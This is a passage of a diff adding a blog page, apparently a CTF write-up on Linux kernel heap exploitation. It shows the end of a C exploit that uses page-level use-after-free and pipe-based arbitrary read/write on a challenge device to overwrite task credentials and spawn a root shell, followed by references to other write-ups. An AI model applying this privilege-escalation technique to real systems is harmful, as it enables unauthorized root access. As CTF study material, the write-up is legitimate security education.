+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[+] Found init_cred: </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m0x%lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, init_cred);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[32m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[+] Found init_nsproxy:</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m0x%lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, init_nsproxy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">/* now, changing the current task_struct to get the full root :) */</span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[*] Escalating ROOT privilege now...&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  current_task_page <span style="color:#ff79c6">=</span> direct_map_addr_to_page_addr(current_task);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pipe_arb_read((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)current_task_page, buf);
+</span></span><span style="display:flex;"><span>  pipe_arb_read((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)(current_task_page <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x40</span>), <span style="color:#ff79c6">&amp;</span>buf[<span style="color:#bd93f9">512</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  tsk_buf <span style="color:#ff79c6">=</span> (size_t <span style="color:#ff79c6">*</span>)((size_t)buf <span style="color:#ff79c6">+</span> (current_task <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xfff</span>));
+</span></span><span style="display:flex;"><span>  tsk_buf[<span style="color:#bd93f9">363</span>] <span style="color:#ff79c6">=</span> init_cred;
+</span></span><span style="display:flex;"><span>  tsk_buf[<span style="color:#bd93f9">364</span>] <span style="color:#ff79c6">=</span> init_cred;
+</span></span><span style="display:flex;"><span>  tsk_buf[<span style="color:#bd93f9">377</span>] <span style="color:#ff79c6">=</span> init_nsproxy;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pipe_arb_write((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)current_task_page, buf, <span style="color:#bd93f9">0xff0</span>);
+</span></span><span style="display:flex;"><span>  pipe_arb_write((<span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">page</span> <span style="color:#ff79c6">*</span>)(current_task_page <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x40</span>), <span style="color:#ff79c6">&amp;</span>buf[<span style="color:#bd93f9">512</span>], <span style="color:#bd93f9">0xff0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[+] Done.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#f1fa8c">&#34;[*] checking for root...&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  get_root_shell();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">bind_core</span>(<span style="color:#8be9fd">int</span> core) {
+</span></span><span style="display:flex;"><span>  cpu_set_t cpu_set;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  CPU_ZERO(<span style="color:#ff79c6">&amp;</span>cpu_set);
+</span></span><span style="display:flex;"><span>  CPU_SET(core, <span style="color:#ff79c6">&amp;</span>cpu_set);
+</span></span><span style="display:flex;"><span>  sched_setaffinity(getpid(), <span style="color:#ff79c6">sizeof</span>(cpu_set), <span style="color:#ff79c6">&amp;</span>cpu_set);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[34m</span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[1m[*] Process binded to core </span><span style="color:#f1fa8c">\033</span><span style="color:#f1fa8c">[0m%d</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, core);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>() {
+</span></span><span style="display:flex;"><span>  bind_core(<span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>  dev_fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/water&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (dev_fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>    err_exit(<span style="color:#f1fa8c">&#34;open /dev/water&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  page_level_uaf();
+</span></span><span style="display:flex;"><span>  second_page_level_uaf();
+</span></span><span style="display:flex;"><span>  construct_self_pipe();
+</span></span><span style="display:flex;"><span>  info_leak();
+</span></span><span style="display:flex;"><span>  privilege_escalation_by_task_overwrite();
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>等哪天心血来潮在做一遍吧</p>
+<h2 id="参考">参考</h2>
+<ul>
+<li><a href="https://www.52pojie.cn/thread-1795570-1-1.html">Linux kernel 堆溢出漏洞分析与利用</a></li>
+<li><a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^ 3CTF2023 d3kcache 出题手记 - arttnba3&rsquo;s blog</a></li>
+<li><a href="https://blog.xmcve.com/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023-Writeup/#title-8">星盟：强网拟态2023 Writeup</a></li>
+<li><a href="https://mp.weixin.qq.com/s/Ls-PQ3VtVRiKRXwHWTQIwA">DJB：2023强网拟态预赛 WP</a></li>
+<li><a href="https://mp.weixin.qq.com/s/3vaT1gJBagSjovJZNZaR-g">El3ctronic：第六届“强网”拟态</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/ctf">ctf</a></li>
+					
+					<li><a href="/tags/kernel">kernel</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
